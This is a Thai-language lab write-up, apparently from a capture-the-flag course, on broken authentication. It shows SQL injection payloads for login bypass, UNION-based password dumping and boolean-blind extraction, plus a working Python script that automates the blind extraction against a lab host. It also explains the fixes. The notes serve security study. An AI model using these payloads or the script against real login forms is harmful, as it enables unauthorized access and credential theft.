# Day 3 — Broken Authentication

---

## สิ่งที่เรียนวันนี้

Day 3 ค่อนข้างไม่ต่างจาก Day 1-2 มากใน Challenge 1 และ Challenge 2 ในแง่มุมของการใช้เทคนิค ส่วนสิ่งที่ได้ประสบการณ์เพิ่มคือการวิเคราะห์การตอบสนองของระบบต่อกิจกรรมที่ทำ เช่น การ Log-in fail เกิดอะไรขึ้นบ้าง การ Log-in success เกิดอะไรขึ้นบ้าง และใน Challenge 3 คือขั้นสูงในการนำเทคนิคมาปรับใช้งาน

Broken Authentication คือช่องโหว่ที่กลไกยืนยันตัวตนของระบบออกแบบไม่ดีเพียงพอ เป็นเรื่องของการออกแบบที่ไม่เหมาะสม กล่าวโดยย่อคือ บ้านที่ออกแบบมาได้ไม่ดี แม้จะมีประตู มีระบบล็อคที่ดี แต่เลือกออกแบบที่ไม่ได้มาตรฐาน โจรก็ยังสามารถเข้าบ้านได้แม้ไม่ต้องงัดบ้าน

**Broken Authentication ≠ SQL Injection** — เป็นคนละช่องโหว่ใน OWASP Top 10 แต่ทับซ้อนกันได้ เพราะ SQLi เป็นวิธีโจมตี แต่ผลลัพธ์คือ authentication ถูก bypass

---

## Authentication Flow ที่ถูกต้อง

ก่อนเข้าใจว่า authentication พังตรงไหน ต้องเข้าใจ flow ปกติก่อน:

1. **Input** — User กรอก username + password
2. **Check** — ระบบเทียบค่า input กับข้อมูลบน Database
3. **Result** — ถ้าข้อมูลถูกต้อง ให้เข้าสู่ระบบ ถ้าไม่ถูกต้องกลับไปรับ input ใหม่
4. **Session** — หลัง login สำเร็จ ระบบสร้าง session เพื่อจำว่า user คนนี้ login แล้ว

Broken Authentication คือจุดไหนก็ได้ใน flow นี้ที่พัง เช่น:
- ขั้น Input — ระบบยอมรับ password ง่ายๆ ได้
- ขั้น Check — ระบบบอกข้อมูลมากเกินไป เช่น "username ถูกแต่ password ผิด"
- ขั้น Login ผิดซ้ำ — ลอง password กี่ครั้งก็ได้ ไม่มี lockout
- ขั้น Session — session token เดาง่าย หรือไม่หมดอายุ

---

## สรุป 3 Challenge

- **Challenge 1:** ใช้เทคนิค String field ฉีด Payload `admin'-- -` → bypass login โดยตัด password check ออก
- **Challenge 2:** ใช้เทคนิค `UNION SELECT + group_concat()` → dump password ทั้งหมดออกมาแสดง
- **Challenge 3:** ใช้เทคนิค `SUBSTR + Boolean-based Blind + Python script` → เดา password ทีละตัวผ่าน HTTP status code (302 = true, 200 = false)

---

## Challenge 1: Bypass Login

### วิธีสำรวจระบบ

หน้า login มี field: username, password และปุ่ม Create an Account

ทดลองสร้าง account ใหม่ → login ได้ปกติ → พบว่าระบบแสดง "Logged in as 1"

ลอง register ชื่อ `admin` → ระบบแจ้ง "Username already exists" พร้อมแสดง query ที่ execute → ยืนยันว่ามี admin อยู่จริงและระบบมี information leakage

### Payload ที่ใช้

```sql
admin'-- -
```

Query ที่ระบบ execute จริง:

```sql
SELECT id, username FROM users WHERE username = 'admin'-- -' AND password = '1'
```

`-- -` ตัด `AND password = '1'` ออก → ระบบเช็คแค่ username = admin → login ผ่านโดยไม่ต้องรู้ password

---

## Challenge 2: UNION SELECT + Dump Passwords

### UNION SELECT คืออะไร

UNION คือการนำผลจาก 2 query มาต่อกัน (เพิ่ม row) โดยมีเงื่อนไขว่าจำนวน column ต้องตรงกัน

จาก query เดิมที่ SELECT 2 column (`id`, `username`) ดังนั้น UNION SELECT ต้อง 2 column เช่นกัน

### ขั้นตอนที่ทำ

**ขั้นที่ 1 — ดึง password เดียว:**

```sql
' UNION SELECT 1, password FROM users-- -
```

ผลลัพธ์: Logged in as `345m3io4hj3` → ได้ password มา 1 ค่า แสดงแทนตำแหน่ง username

**ขั้นที่ 2 — ดึง password ทั้งหมดด้วย group_concat():**

```sql
' UNION SELECT 1, group_concat(password) FROM users-- -
```

ผลลัพธ์: Logged in as `rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{...},viking123`

### Finding ที่ควรแจ้งลูกค้าจาก Challenge นี้

1. **SQL Injection ที่ login form** — root cause คือไม่ใช้ parameterized query
2. **Plain text password storage** — ต้องเปลี่ยนเป็น hash + salt
3. **Weak password policy** — ไม่มีการบังคับความซับซ้อนของ password เช่น `asd`, `Summer2019!`

---

## Challenge 3: Boolean-based Blind Injection

### Blind Injection คืออะไร

ใช้เมื่อระบบมีช่องโหว่ SQLi แต่ไม่แสดงผลลัพธ์ของ query กลับมาให้เห็น เลยต้องอาศัยการถาม true/false ทีละคำถามแทน

- Login สำเร็จ = **302 redirect** → คำตอบคือ **TRUE**
- Login ไม่สำเร็จ = **200 + error message** → คำตอบคือ **FALSE**

### ขั้นตอนที่ทำ

**ขั้นที่ 1 — หาความยาว password:**

```sql
admin' AND length((SELECT password FROM users WHERE username='admin'))==37-- -
```

Login ได้ → password ยาว 37 ตัว

**ขั้นที่ 2 — ทดสอบตัวอักษรแรกด้วยมือ:**

```sql
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
```

Login ได้ → ตัวแรกคือ T (hex `54`)

> ต้องใช้ hex `X'54'` แทน `'T'` เพราะระบบแปลง username เป็นตัวพิมพ์เล็กทั้งหมด ถ้าเขียน `= 'T'` ระบบจะแปลงเป็น `= 't'` ซึ่งไม่ตรงกับ T ใน password

**ขั้นที่ 3 — เขียน Python script ทำ automation:**

```python
import requests

url = "http://10.48.156.139:5000/challenge3/login"
password_len = 37
found_password = ""

for position in range(1, password_len + 1):
    for char_code in range(32, 127):
        hex_value = format(char_code, '02x')
        payload = f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{position},1) = CAST(X'{hex_value}' as Text)-- -"

        data = {
            "username": payload,
            "password": "1"
        }

        response = requests.post(url, data=data, allow_redirects=False)

        if response.status_code == 302:
            found_password += chr(char_code)
            print(f"[+] Position {position}: {chr(char_code)} | Password so far: {found_password}")
            break

print(f"\n[*] Final password: {found_password}")
```

**Logic ของ script:**
- **loop นอก** (`for position`) = เลื่อนตำแหน่งตัวอักษร (1 ถึง 37)
- **loop ใน** (`for char_code`) = สุ่มตัวอักษร ASCII ทุกตัวที่พิมพ์ได้ (32-127)
- ถ้า 302 → จำตัวอักษรนั้น → เลื่อนไปตำแหน่งถัดไป
- ถ้า 200 → ลองตัวอักษรถัดไป

`range(32, 127)` ครอบคลุม: space, 0-9, A-Z, a-z และสัญลักษณ์เช่น `{`, `}`, `!`, `_`

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### UNION กับ group_concat() — เข้าใจผิดในตอนแรก

**เข้าใจผิด:** คิดว่า UNION คือหมวดหมู่ใหญ่ และ group_concat คือการนำมาใช้งาน เป็นส่วนหนึ่งของกันและกัน

**ที่ถูกต้อง:** ทั้ง 2 ใช้งานไม่เหมือนกัน
- **UNION** = นำผลจาก query มาต่อกัน (เพิ่ม row)
- **group_concat()** = นำหลายๆ row มารวมเป็น string เดียว

### SUBSTR — ตำแหน่งกับความยาวสับสน

**เข้าใจผิด:** คิดว่า `SUBSTR(string, 1, 2)` คือดึงตัวที่ 2

**ที่ถูกต้อง:** `SUBSTR(string, ตำแหน่งเริ่ม, ความยาว)`
- `SUBSTR("THM", 1, 1)` = **T** (เริ่มตำแหน่ง 1 ดึง 1 ตัว)
- `SUBSTR("THM", 2, 1)` = **H** (เริ่มตำแหน่ง 2 ดึง 1 ตัว)
- `SUBSTR("THM", 1, 2)` = **TH** (เริ่มตำแหน่ง 1 ดึง 2 ตัว)

### SELECT column ตอนใช้ UNION

**เข้าใจผิด:** ใส่ `UNION SELECT id, username` → ได้ข้อมูลเดิมที่ query ดึงอยู่แล้ว

**ที่ถูกต้อง:** ต้องทราบโครงสร้างของ query ให้ชัดเจน และเลือก column ที่ต้องการจริงๆ เช่น `UNION SELECT 1, password` เพื่อให้ password แสดงแทนตำแหน่ง username

### Broken Authentication — เข้าใจผิดในตอนแรก

**เข้าใจผิด:** คิดว่า Broken Authentication เป็นการแยกประเภทของช่องโหว่ SQL Injection

**ที่ถูกต้อง:** Broken Authentication (A2) กับ Injection (A1) เป็นคนละช่องโหว่ใน OWASP Top 10 แต่ทับซ้อนกันได้ Broken Authentication ครอบคลุมกว้างกว่า เช่น weak password, ไม่มี lockout, session ไม่หมดอายุ, ไม่มี MFA — ไม่จำเป็นต้องมี SQLi เลยก็เป็น Broken Auth ได้

---

## Lesson สำคัญที่สุดของวันนี้

- **Information disclosure เป็น attack surface** — แค่ช่องโหว่เพียงข้อเดียวที่บอกถึงสถานะของ User อย่าง "Logged in as..." สามารถใช้เป็นจุดโจมตีได้หลากหลาย เช่น ใช้แสดงข้อมูลการ SELECT จาก Database, การแสดงชื่อผู้ใช้งานปัจจุบัน หากระบบออกแบบให้ไม่มีส่วนนี้ บาง Challenge อาจไม่สามารถผ่านได้ นั่นทำให้เห็นถึงการออกแบบที่ไม่รัดกุมเพียงพอส่งผลให้ระบบมีช่องโหว่

- **ประเภทของ SQLi ควรทำความเข้าใจให้ถูกต้อง** เพื่อลดความสับสน:
  1. **Classic (In-band)** — ผลลัพธ์แสดงให้เห็นโดยตรง เช่น Challenge 1 และ 2
  2. **Boolean-based Blind** — ดูจาก response ว่า true/false เช่น Challenge 3 (302 vs 200)
  3. **Time-based Blind** — ดูจากเวลาตอบสนอง เช่นใส่ `SLEEP(5)` ถ้าระบบตอบช้า 5 วินาที = true ใช้เมื่อระบบไม่มีแม้แต่ความต่างระหว่าง response สำเร็จกับไม่สำเร็จ

- **Plain text password storage เป็น critical finding** — ระหว่าง Day 2 ที่ระบบเก็บ password แบบ Hash แม้จะทราบ Hash แต่ไม่สามารถ Log-in ได้ แตกต่างจาก Day 3 ที่ระบบเก็บเป็น plain text หากเข้าถึง password ได้ก็ Log-in ได้ทันที

- **Parameterized query คือ root fix ไม่ใช่ WAF** — ปัญหา Broken Authentication ต้องแก้ที่ root cause จริงคือการออกแบบ code ที่ไม่ใช้ parameterized query การมี WAF เสมือนมียามเฝ้าหน้าบ้าน แต่ถ้าบ้านออกแบบความปลอดภัยไม่ดี ยามก็ไม่สามารถป้องกันได้

- **Python script ตัวแรกที่ใช้งานจริง** — สำหรับวันนี้ได้ทดลองเขียน Python script ตัวแรกที่ใช้งานได้จริง รู้สึกว่า Python เข้าใจง่ายกว่าที่คิด สั้น กระชับ และค่อนข้างเร็วมากในการประมวลผล เช่น การสุ่มข้อมูลยาว 37 ตัวอักษรด้วย range(32, 127) ใช้เวลาไม่ถึง 5 วินาที

---

## คำถามที่ยังไม่ชัด / Open Question

หากมีโอกาสและเวลาอยากศึกษา Python script มากกว่านี้ เพราะค่อนข้างเร็วมากในงานอย่างการประมวลผล การสุ่มข้อมูลยาว 37 ตัวอักษรด้วย range(32, 127) ใช้เวลาไม่ถึง 5 วินาที ซึ่งเป็น skill ที่จะช่วยได้มากในงาน Security ต่อไป

---

*Day 3 Complete — ต่อไป: Day 4*
